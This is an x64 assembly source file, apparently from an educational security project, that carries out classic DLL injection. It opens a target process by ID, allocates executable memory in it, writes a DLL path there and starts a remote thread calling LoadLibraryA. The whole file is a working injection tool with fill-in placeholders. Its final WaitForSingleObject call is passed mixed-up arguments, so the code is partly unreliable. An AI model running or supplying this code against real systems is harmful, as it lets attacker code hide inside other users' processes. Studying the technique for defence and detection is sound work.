; ╔═══════════════════════════════════════════════════════════╗
; ║                                                           ║
; ║                     ⚠️  WARNING!  ⚠️                     ║
; ║                                                           ║
; ║  @author: bekoo                                           ║
; ║  @website: 0xbekoo.github.io                              ║
; ║  @Technique: DLL Injection                                ║
; ║                                                           ║
; ║  @warning: This project has been developed for            ║
; ║  educational purposes only. Its use in real scenarios     ║
; ║  is at one's own risk.                                    ║
; ║                                                           ║
; ╚═══════════════════════════════════════════════════════════╝

include utils.inc

.data
    PID     DW 0                ; In this variable, you need to enter the Process ID
    dllPath db "\path\to\dll",0 ; In this variable, you need to enter the path to your dll

.code 

mainCRTStartup PROC 
    lea rcx,[Kernel32Str]
    call GetModuleHandleA
    mov rcx,rax
    lea rdx,[Kernel32Address]
    call CheckFunctionResult

    mov rcx,[Kernel32Address]
    lea rdx,[LoadLibraryStr]
    call GetProcAddress
    mov rcx,rax
    lea rdx,[LoadLibraryAddress]
    call CheckFunctionResult

    mov rcx,1FFFFFh
    xor rdx,rdx
    movzx r8d,word ptr [PID]
    call OpenProcess 
    mov rcx,rax
    lea rdx,[HandleProcess]
    call CheckFunctionResult

    mov rcx,[HandleProcess]
    xor rdx,rdx
    mov r8,sizeof dllPath
    mov r9d,3000h
    mov dword ptr [rsp + 20h],40h
    call VirtualAllocEx
    mov rcx,rax
    lea rdx,[RemoteBuffer]
    call CheckFunctionResult

    mov rcx,[HandleProcess]
    mov rdx,[RemoteBuffer]
    lea r8,[dllPath]
    mov r9d,sizeof dllPath
    mov qword ptr [rsp + 20h],0
    call WriteProcessMemory
    mov rcx,rax
    xor rdx,rdx
    call CheckFunctionResult

    mov rcx,[HandleProcess]
    xor edx,edx
    xor r8d,r8d
    mov r9,[LoadLibraryAddress]
    mov rsi,[RemoteBuffer]           
    mov qword ptr [rsp + 20h],rsi
    mov qword ptr [rsp + 28h],0
    mov qword ptr [rsp + 30h],0;
    call CreateRemoteThread
    mov rcx,rax
    lea rdx,[HandleThread]
    call CheckFunctionResult

    mov edx,0FFFFFFFFh
    mov rdx,[HandleThread]
    call WaitForSingleObject

    jmp ExitProgram
mainCRTStartup ENDP 
END 